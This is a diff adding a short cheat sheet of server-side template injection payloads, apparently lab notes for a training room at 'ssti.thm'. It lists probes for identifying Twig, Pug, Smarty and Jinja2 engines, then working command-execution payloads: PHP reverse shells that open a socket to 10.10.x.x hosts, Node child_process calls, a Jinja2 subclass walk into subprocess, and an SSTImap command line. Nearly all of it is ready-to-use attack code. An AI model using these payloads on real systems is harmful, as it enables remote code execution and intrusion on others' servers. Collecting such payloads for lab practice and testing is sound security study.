@@ -1,0 +1,36 @@
+PHP reverse shell used:
+test: {{exec('id')}}
+shell:
+{{exec("php -r '\$sock=fsockopen(\"10.10.213.77\",9001);passthru(\"sh <&3 >&3 2>&3\");'")}}
+{{exec("php -r '\$sock=fsockopen(\"10.10.149.170\",1234);exec(\"sh <&3 >&3 2>&3\");'")}}
+
+Twig
+payload {{7*'7'}}
+
+Jade/Pug
+payload #{7*7}
+
+PHP Smarty
+{'Hello'|upper} (If the application returns "HELLO", it means that the template engine used by the application is Smarty.)
+
+payload {system("ls")}
+
+NodeJS - Pug
+payload #{7*7}
+ls
+#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
+ls -lah
+#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
+
+Python - Jinja2
+payload {{7*7}}
+
+ls
+{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
+
+ls -lah
+{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
+
+SSTImap
+
+python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
